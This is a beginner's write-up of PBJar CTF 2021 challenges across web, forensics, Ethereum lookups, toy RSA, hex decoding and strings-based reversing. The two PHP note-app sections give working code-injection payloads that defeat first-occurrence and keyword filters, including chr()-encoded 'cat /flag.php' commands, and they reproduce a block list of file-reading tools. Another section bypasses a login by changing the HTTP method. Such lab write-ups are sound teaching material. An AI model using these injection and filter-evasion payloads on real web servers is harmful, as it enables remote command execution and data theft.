# Reyce Salisbury's PBJar CTF Writeups for the 2021 PBJar CTF Competition.

## Table of Contents:

### Introduction
### Web
 - ProgrammersHateProgramming
 - ProgrammersHateProgramming2
 - cOrL
### Forensics
 - StegosaurusStenops
 - Luna Guesser
### Misc
 - Miner
 - MEV
### Crypto
 - ReallynotSecureAlgorithm
 - Convert
### Reversing
 - Polymer
 - Web

## Introduction

Alrighty, so this is my first writeup for my first ever CTF competition and I thought I did pretty well!
The team as a whole got 11 flags (not including the obligatory Given flag for getting the discord) and I 
got 6 of those during the time limit. I also went back and got a few flags after time ended just for my own
research purposes. Thank you for checking out my writeups and I hope you enjoy the presentation!

# Web

## ProgrammersHateProgramming
### Hint: URL of webpage as well as source code

Sourcecode reads:
```
if(isset($_POST["notewrite"]))
{
    $newnote = $_POST["notewrite"];
    $notetoadd = str_replace_first("<?php", "", $newnote);
    $notetoadd = str_replace_first("?>", "", $notetoadd);
    $notetoadd = str_replace_first("<script>", "", $notetoadd);
    $notetoadd = str_replace_first("</script>", "", $notetoadd);
    $notetoadd = str_replace_first("flag", "", $notetoadd);

    $filename = generateRandomString();
    array_push($_SESSION["notes"], "$filename.php");
    file_put_contents("$filename.php", $notetoadd);
    header("location:index.php");
}
```
Just by looking at this sourcecode one can immediatly tell that this webpage is susceptible to php injection attacks.
The webpage had a text input bar that stored notes on the page, which was the main and only interface on the page.
Realizing that it only erased the _first_ value that it catches in the input bar, I immediatly got to work.
I started off sending a simple ```<?php <?php system("ls"); ?> ?>``` to see if it would do anything and it listed the contents
of the current directory, just as expected. As a shot in the dark, I sent ```<?php <?php system("cat /flag.php"); ?> ?>```
and it turned out the flag was at the root directory in a php file!

Flag: flag{server_side_php_xss_is_less_known_but_considering_almost_80%_of_websites_use_php_it_is_good_to_know_thank_me_later_i_dont_want_to_stop_typing_this_flagg_is_getting_long_but_i_feel_like_we're_developing_a_really_meaningful_connection}

## ProgrammersHateProgramming2
### Hint: URL of webpage as well as source code

Sourcecode reads:
```
<?php
if(isset($_POST["notewrite"]))
{
    $newnote = $_POST["notewrite"];
    $notetoadd = str_replace_first("<?php", "", $newnote);
    $notetoadd = str_replace_first("?>", "", $notetoadd);
    $notetoadd = str_replace_first("<?", "", $notetoadd);
    $notetoadd = str_replace_first("flag", "", $notetoadd);

    $notetoadd = str_replace("fopen", "", $notetoadd);
    $notetoadd = str_replace("fread", "", $notetoadd);
    $notetoadd = str_replace("file_get_contents", "", $notetoadd);
    $notetoadd = str_replace("fgets", "", $notetoadd);
    $notetoadd = str_replace("cat", "", $notetoadd);
    $notetoadd = str_replace("strings", "", $notetoadd);
    $notetoadd = str_replace("less", "", $notetoadd);
    $notetoadd = str_replace("more", "", $notetoadd);
    $notetoadd = str_replace("head", "", $notetoadd);
    $notetoadd = str_replace("tail", "", $notetoadd);
    $notetoadd = str_replace("dd", "", $notetoadd);
    $notetoadd = str_replace("cut", "", $notetoadd);
    $notetoadd = str_replace("grep", "", $notetoadd);
    $notetoadd = str_replace("tac", "", $notetoadd);
    $notetoadd = str_replace("awk", "", $notetoadd);
    $notetoadd = str_replace("sed", "", $notetoadd);
    $notetoadd = str_replace("read", "", $notetoadd);
    $notetoadd = str_replace("ls", "", $notetoadd);
    $notetoadd = str_replace("ZeroDayTea is not hot", "", $notetoadd);

    $filename = generateRandomString();
    file_put_contents("$filename.php", $notetoadd);
    header("location:index.php");
}
?>
```
This webpage again has an input section that stores the input values on the server.
As one can see, this problem is very similar to the previous problem, however the web page catches a much wider range
of inputs. To get around this, I simply sent the code I needed into the input text box as ascii values. To do this, I
wrote code that would do it for me :)
```
instr = input("> ")

for c in instr:
    print("chr({}) . ".format(ord(c)), end="")

print()
```
This code takes input values and returns them as a string of ascii values.

since the sourcecode removes ```flag``` after removing ```<?php```, I had it create ```<?php``` by putting ```flag```
inside of ```<?php``` so: ```<flag?php```

I then tested if the ascii solution would work by sending:
```<flag?php system("chr(108) . chr(115) . chr(32) . chr(45) . chr(97) . chr(108) . chr(32) . chr(47)") ?> ?>```
(ls -al /)
which printed the list of files in the directory. After that I attempted to ```cat /flag.php``` like I did in 
ProgrammersHateProgramming:
```<flag?php system("chr(99) . chr(97) . chr(116) . chr(32) . chr(47) . chr(102) . chr(108) . chr(97) . chr(103) . chr(46) . chr(112) . chr(104) . chr(112)") ?> ?>```
which got us the flag!

Flag:
flag{wow_that_was_a_lot_of_filters_anyways_how_about_that_meaningful_connection_i_mentioned_earlier_:)}

## cOrL
### Hint: URL

In my opinion, this web challenge is really easy. As the name implies, the easiest way to get the flag is by using cURL.
Upon opening the URL in the challenge, one is faced with a login form looking like this:
![image](https://user-images.githubusercontent.com/69910524/134600521-a8524d7e-7f79-40dc-b5a0-fe3ed41a3efb.png)

If we change the request from POST to PUT, and then send the data in the body (like the website hints at) then we can probably get the flag. 

```
┌──(kali㉿kali)-[~]
└─$ curl -X PUT "http://147.182.172.217:42003/index.php" -d "username=admin&password=admin"

<html>
<head>
    <title> cOrL </title>

    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet">

    <link href="https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css" rel="stylesheet">

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
</head>
<div class="container">
<div class="jumbotron">
    <div class="login-form">
        <form role="form" action="index.php" method="post">
            <div class="form-group">
                <input type="text" name="username" id="password" class="form-control input-lg" placeholder="Username">
                <input type="password" name="password" id="password" class="form-control input-lg" placeholder="Password">
                <input type="submit" class="btn btn-lg btn-success btn-block" value="Login">
                <h4 class="text-center" style="color:green">Ah so you must indeed be admin if you put through those protections! The flag is flag{HTTP_r3qu35t_m3th0d5_ftw}</h4>            </div>
        </form>
    </div>
</div>
</div>
</html>
```
And there we have the flag
Flag: flag{HTTP_r3qu35t_m3th0d5_ftw}

# Foresics
## Stegosaurus stenops
### Hint: This stenops swallowed the flag... and some unusually large rock
![image](https://user-images.githubusercontent.com/69910524/134601836-21589471-9a0a-4481-b62e-1b2c262e7a85.png)
This is (obviously) a steganography challenge. The other hint "some unusually large rock" can be attributed to the 
RockYou.txt wordlist.

First, if you havent unzipped the RockYou.txt wordlist, head to /usr/share/wordlists/RockYou.txt and run 
```gunzip rockyou.txt.gz```

You will also need to download Stegcracker or Stegseek, for this I chose stegcracker, even though stegseek is FAR faster.

```sudo apt-get install stegcracker```

Next: head back to your directory where you saved stegosaurus.jpg, for me it was downloads (default) Now you want to run
stegcracker on stegosaurus.jpg with the RockYou.txt wordlist, this is simple:
```stegcracker stegosaurus.jpg /usr/share/wordlists/rockyou.txt```
this will get you the flag and store the output in stegosaurus.jpg.out. 

Flag: flag{ungulatus_better_than_stenops}

## Luna Guesser
### Hint: We intercepted this message being sent from a strange location. Can you figure out where it's being sent from? Note: The flag is the name of a location. All lowercase letters and words separated by underscores. ex: flag{new_york_city}

In this challenge you were given a sound file, LunaGuesser.wav, which if opened was SO annoying. If run through a spectrum analyzer, it seems like it starts with a header before sending more data.

After googling around I found and followed this guide: https://ourcodeworld.com/articles/read/956/how-to-convert-decode-a-slow-scan-television-transmissions-sstv-audio-file-to-images-using-qsstv-in-ubuntu-18-04

This gave the following picture: moon.png
![image](https://user-images.githubusercontent.com/69910524/134605951-0cda51ed-f12b-400a-8f56-b46b7c2bd9e3.png)
Since the flag is a location, I figured the flag would be where the moon landing was on the moon, after a quick google search we have the flag!

Flag: flag{mare_tranquillitatis}

# Misc
## Miner
### Hint: Block #11834380 on the Ethereum Blockchain was mined on Febuary 11th at 9:12:59 AM UTC. What is the address of the miner who validated this block? Flag format: flag{0x0000000000000000000000000000000000000000}

So this one is super easy. All you need to know is how the ETH Blockchain works and tools to use to navigate it. I used Etherscan.

After going to https://etherscan.io/block/11834380 one can clearly see that the miner of this Block was: 0xD224cA0c819e8E97ba0136B3b95ceFf503B79f53 (change the capital letters to lowercase for flag formatting, ETH addresses are not case sensitive.)

Flag: flag{0xd224ca0c819e8e97ba0136b3b95ceff503b79f53}

## MEV
### The miner of Block #12983883 on the Ethereum Blockchain partakes in the common practice of MEV. What is the exact amount of Ether that was transfered to the miner as a bribe from the transaction that was included first in this block? Info about MEV: https://ethereum.org/en/developers/docs/mev/ Flag format: flag{0.006942069420}

Again use etherscan to solve this problem. Since we know this miner participates in MEV (which one can see after going to https://etherscan.io/block/12983883) basically look at the block reward for the miner that mined it: 
```2.062115350367643915 Ether (2 + 0.338290779110282795 - 0.27617542874263888)```
0.338290779110282795 - 0.27617542874263888 = 0.06211535036

Flag: flag{0.06211535036}

# Crypto
## ReallynotSecureAlgorithm
### Hint: Here's the obligatory problem!!!
You're given source code and an output file
```
from Crypto.Util.number import *
with open('flag.txt','rb') as f:
    flag = f.read().strip()
e=65537
p=getPrime(128)
q=getPrime(128)
n=p*q
m=bytes_to_long(flag)
ct=pow(m,e,n)


print (p)
print (q)
print (e)
print (ct)
```
```
194522226411154500868209046072773892801
288543888189520095825105581859098503663
65537
2680665419605434578386620658057993903866911471752759293737529277281335077856
```
based on this output we know:
```
p = 194522226411154500868209046072773892801
q = 288543888189520095825105581859098503663
e = 65537
ct = 2680665419605434578386620658057993903866911471752759293737529277281335077856
```
https://www.dcode.fr/rsa-cipher THANK GOD FOR DCODE!!!

from here its just plug and chug:
![image](https://user-images.githubusercontent.com/69910524/134607553-b28cd669-f057-4e2d-865c-4965064b6624.png)
Hit DECRYPT and the flag is given.

Flag: flag{n0t_to0_h4rd_rIt3_19290453}

## Convert
### Hint: So this is supposed to be the challenge for absolute beginners. For this chall, you will get a hexadecimal number, and have to convert it to text. If you don't know how to do this, Google is your best friend!!!

After unzipping the given file, we get the following: 666c61677b6469735f69735f615f666c346767675f68317d

So now we just _convert_ the Hex values to ascii values. This can easily be done in python:

![image](https://user-images.githubusercontent.com/69910524/134608209-70475fb2-b5b4-474b-a322-b498aea60490.png)

Flag: flag{dis_is_a_fl4ggg_h1}

# Reversing
## Polymer
### Hint: I learned in my biology class that a polymer is a chain of monomers that can sometimes form long strings of molecules.

There's a few ways to do this one. One could use Ghidra as a true reverser, or they could do what I did :/

first I tried ```strings polymer | grep flag{ > outs.txt``` but then I realized that the file is filled with a ton of fake flags.
the fake flags are scattered throughout the file so instead of searching throught hundreds of lines of "flag{n0t_th3_fl4g_l0l}", I just ran ```strings polymer | grep -o -E "flag\{[a-zA-Z0-9_]+\}" | grep -v "flag{n0t_th3_fl4g_l0l}"```
one could also use sed to substitute the fake flags like so
```strings polymer | grep -o -E "flag\{[a-zA-Z0-9_]+\}" > out.txt | sed 's/flag{n0t_th3_fl4g_l0l}//g'```

Flag: flag{ju5t_4n0th3r_str1ng5_pr0bl3m_0159394921}

## Web
### Hint: I downloaded this program back when the version number was still v1. It's been a long time... I heard the most recent update has the flag in it. Download: http://147.182.172.217:42100/v1

Going to this URL gave me a ELF file, which contained a URL http://147.182.172.217:42100/v2, which game me an ELF file which contianed yet another URL http://147.182.172.217:42100/v3. Follwing this pattern, I tried http://147.182.172.217:42100/v99999999
which had a file that was about 18KB. I took another shot in the dark and tried http://147.182.172.217:42100/v200000000 which returned "version not found".

Now we just have to perform a binary search between 99999999 and 200000000 for the version that the program ends on. 
```
n = 99999999
k = 200000000
def search():
    return (1 + k) // 2
```
Get the number for the center of a current range by running search() and access the url with the number, if it gives you another "version not found", run k = search(), otherwise run n = search(). Repeat until you have narrowed down the range all the way. This eventually will give you http://147.182.172.217:42100/v133791021. After downloading the file sent by the server, and running strings on it, it gives you the flag.

Flag: flag{h0w_l0ng_wer3_y0u_g0ne_f0r_3910512832}
